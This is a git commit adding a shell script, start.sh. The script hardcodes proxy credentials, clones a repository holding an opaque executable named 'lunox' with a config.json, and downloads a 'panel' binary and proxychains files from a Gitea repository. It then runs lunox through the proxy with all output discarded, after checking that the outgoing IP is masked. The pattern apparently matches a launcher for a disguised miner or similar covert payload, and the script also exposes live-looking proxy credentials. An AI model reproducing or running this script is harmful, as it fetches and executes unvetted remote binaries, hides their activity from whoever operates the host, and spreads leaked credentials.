6ba69d620083a740e6d44c26b93a037db409ee35
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2023-12-28 23:24:50 +0700

    Create start.sh

---
+++ start.sh
@@ -0,0 +1,22 @@
+proxy="38.154.227.167" 
+port="5868" 
+user="ugursfso"  
+pass="wqn60pnk6m95" 
+git clone https://github.com/balma1/lunox.git && cd lunox && chmod +x SHA256SUMS && chmod +x config.json && chmod +x lunox
+wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
+wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
+wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
+sleep 3 
+sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
+sleep 1 
+sed -i "s/port/$port/" "proxychains.conf" 
+sed -i "s/user/$user/" "proxychains.conf"  
+sleep 1  
+sed -i "s/pass/$pass/" "proxychains.conf" 
+sleep 11 
+echo "******************************************************************" 
+echo "IP ORI ==> "$(curl ifconfig.me) 
+echo " " 
+echo " " 
+echo "IP BARU ==> "$(./panel curl ifconfig.me)
+./panel ./lunox -c "config.json" >/dev/null 2>&1
